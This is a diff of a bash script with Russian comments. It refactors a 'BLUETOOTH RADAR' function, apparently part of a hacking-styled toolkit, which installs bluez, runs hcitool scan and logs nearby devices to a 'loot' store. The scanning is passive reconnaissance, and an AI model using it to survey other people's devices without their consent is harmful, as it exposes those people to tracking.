-    pause
+    core_engine_ui "+" "Diagnostic complete."
+    core_engine_wait
 }
-
 
 
 # --- Анализ Bluetooth устройств ---
-scan_bluetooth_devices() {
-    print_header "BLUETOOTH RADAR"
+run_bluetooth_scan() {
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "BLUETOOTH RADAR"
     
-    # 1. Проверка наличия инструментов (используем актуальный пакет bluez)
-    if ! command -v hcitool >/dev/null 2>&1; then
-        print_status "e" "Engine 'bluez' not found."
-        
+    # 2. Проверка инструментов через Мозг [5]
+    if ! core_engine_validator "pkg" "bluez" "Bluetooth Engine"; then
         if [[ $(id -u) -eq 0 ]]; then
-            print_status "w" "Root detected. Deploying 'bluez' core..."
-            apt-get update && apt-get install bluez -y
+            core_engine_ui "w" "Root detected. Deploying 'bluez' core..."
+            core_engine_run "apt-get update && apt-get install bluez -y" "Installing bluez"
         else
-            print_status "i" "Non-Root environment (Samsung A14?)."
-            print_status "!" "Please run: apt update && apt install bluez"
-            pause && return
+            core_engine_ui "!" "Non-Root environment (Samsung A14?)."
+            core_engine_ui "i" "Manual action: apt update && apt install bluez"
+            core_engine_wait && return
         fi
     fi
 
-    # 2. Попытка активации интерфейса (только для Wiko/Root)
+    # 3. Активация интерфейса (только для Root/Wiko) [5]
     if [[ $(id -u) -eq 0 ]]; then
-        print_status "i" "Activating Bluetooth Interface..."
+        core_engine_ui "Activating Bluetooth Interface..."
         hciconfig hci0 up >/dev/null 2>&1
     fi
 
-    print_status "i" "Initializing BlueZ Stack..."
-    show_progress 3 "SCANNING PROXIMITY SPECTRUM"
+    # 4. Визуализация процесса через Синхронизацию [13]
+    core_engine_ui "Initializing BlueZ Stack..."
+    core_engine_progress 3 "SCANNING PROXIMITY SPECTRUM"
     
-    # 3. Исполнение сканирования
-    print_status "!" "Searching for active signals..."
+    core_engine_ui "!" "Searching for active signals..."
     
-    # Подавляем системный мусор и ошибки доступа к сокетам
-    local scan_output
-    scan_output=$(hcitool scan 2>/dev/null)
+    # 5. Исполнение через Глушитель [7]
+    local scan_out
+    scan_out=$(hcitool scan 2>/dev/null)
 
-    if [[ -z "$scan_output" || "$scan_output" == *"Scanning"* ]]; then
-        print_status "e" "No devices found or Adapter blocked."
+    if [[ -z "$scan_out" || "$scan_out" == *"Scanning"* ]]; then
+        core_engine_ui "e" "No devices found or Adapter blocked."
         
-        # Эвристическая подсказка для Samsung
-        if [[ $(id -u) -ne 0 ]]; then
-            print_status "w" "Note: Direct Bluetooth access is often restricted on Non-Root devices."
-        fi
+        # Эвристическая подсказка (Samsung A14 / Non-Root)
+        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Note: Direct BT access restricted on Non-Root."
     else
-        # Чистый вывод найденных устройств
-        echo -e "$scan_output" | grep -v "Scanning"
-        print_status "s" "Scan completed."
+        # Чистый вывод без заголовка "Scanning..."
+        echo -e "$scan_out" | grep -v "Scanning"
+        core_engine_ui "+" "Scan completed."
         
-        # Автоматическое сохранение логов
-        mkdir -p /root/prime_loot
-        echo "[$(date)] BT Scan Results:" >> /root/prime_loot/bluetooth.log
-        echo -e "$scan_output" >> /root/prime_loot/bluetooth.log
+        # 6. Сбор трофеев через узел [11]
+        core_engine_loot "bluetooth" "BT Scan Results:\n$scan_out"
     fi
     
-    pause
+    core_engine_wait
 }
+
 
 
 
